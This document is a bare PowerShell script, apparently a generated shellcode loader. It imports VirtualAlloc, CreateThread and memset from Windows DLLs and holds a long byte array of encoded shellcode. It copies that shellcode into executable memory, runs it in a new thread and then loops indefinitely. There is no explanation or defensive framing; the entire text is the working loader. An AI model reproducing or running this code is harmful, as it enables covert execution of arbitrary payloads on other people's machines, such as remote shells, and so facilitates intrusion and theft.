$C3H = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $C3H -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc3,0xd9,0x74,0x24,0xf4,0xba,0xe9,0x8f,0x47,0xca,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x55,0x18,0x83,0xc5,0x04,0x03,0x55,0xfd,0x6d,0xb2,0x36,0x15,0xf3,0x3d,0xc7,0xe5,0x94,0xb4,0x22,0xd4,0x94,0xa3,0x27,0x46,0x25,0xa7,0x6a,0x6a,0xce,0xe5,0x9e,0xf9,0xa2,0x21,0x90,0x4a,0x08,0x14,0x9f,0x4b,0x21,0x64,0xbe,0xcf,0x38,0xb9,0x60,0xee,0xf2,0xcc,0x61,0x37,0xee,0x3d,0x33,0xe0,0x64,0x93,0xa4,0x85,0x31,0x28,0x4e,0xd5,0xd4,0x28,0xb3,0xad,0xd7,0x19,0x62,0xa6,0x81,0xb9,0x84,0x6b,0xba,0xf3,0x9e,0x68,0x87,0x4a,0x14,0x5a,0x73,0x4d,0xfc,0x93,0x7c,0xe2,0xc1,0x1c,0x8f,0xfa,0x06,0x9a,0x70,0x89,0x7e,0xd9,0x0d,0x8a,0x44,0xa0,0xc9,0x1f,0x5f,0x02,0x99,0xb8,0xbb,0xb3,0x4e,0x5e,0x4f,0xbf,0x3b,0x14,0x17,0xa3,0xba,0xf9,0x23,0xdf,0x37,0xfc,0xe3,0x56,0x03,0xdb,0x27,0x33,0xd7,0x42,0x71,0x99,0xb6,0x7b,0x61,0x42,0x66,0xde,0xe9,0x6e,0x73,0x53,0xb0,0xe6,0xb0,0x5e,0x4b,0xf6,0xde,0xe9,0x38,0xc4,0x41,0x42,0xd7,0x64,0x09,0x4c,0x20,0x8b,0x20,0x28,0xbe,0x72,0xcb,0x49,0x96,0xb0,0x9f,0x19,0x80,0x11,0xa0,0xf1,0x50,0x9e,0x75,0x6f,0x54,0x08,0xb6,0xd8,0x8f,0x4a,0x5e,0x1b,0x30,0x4a,0xcf,0x92,0xd6,0x1a,0xbf,0xf4,0x46,0xda,0x6f,0xb5,0x36,0xb2,0x65,0x3a,0x68,0xa2,0x85,0x90,0x01,0x48,0x6a,0x4d,0x79,0xe4,0x13,0xd4,0xf1,0x95,0xdc,0xc2,0x7f,0x95,0x57,0xe1,0x80,0x5b,0x90,0x8c,0x92,0x0b,0x50,0xdb,0xc9,0x9d,0x6f,0xf1,0x64,0x21,0xfa,0xfe,0x2e,0x76,0x92,0xfc,0x17,0xb0,0x3d,0xfe,0x7d,0xcb,0xf4,0x6a,0x3e,0xa3,0xf8,0x7a,0xbe,0x33,0xaf,0x10,0xbe,0x5b,0x17,0x41,0xed,0x7e,0x58,0x5c,0x81,0xd3,0xcd,0x5f,0xf0,0x80,0x46,0x08,0xfe,0xff,0xa1,0x97,0x01,0x2a,0x30,0xeb,0xd7,0x12,0x46,0x05,0xe4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$iyGe=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($iyGe.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$iyGe,0,0,0);for (;;){Start-sleep 60};